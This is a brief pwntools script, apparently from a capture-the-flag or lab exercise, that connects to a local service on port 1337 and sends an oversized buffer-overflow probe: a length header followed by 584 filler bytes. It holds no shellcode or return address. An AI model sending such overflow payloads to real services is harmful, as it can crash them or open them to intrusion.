from pwn import *
io = remote('127.0.0.1', 1337)

context.arch      = 'amd64'
context.os        = 'linux'
context.endian    = 'little'
context.word_size = 64


size_bytes = 1000 
size = p32(size_bytes, endian='big')
payload = [
    size,
    b'C' * 520,
    b'D' * 64,
]

payload = b"".join(payload)
io.send(payload)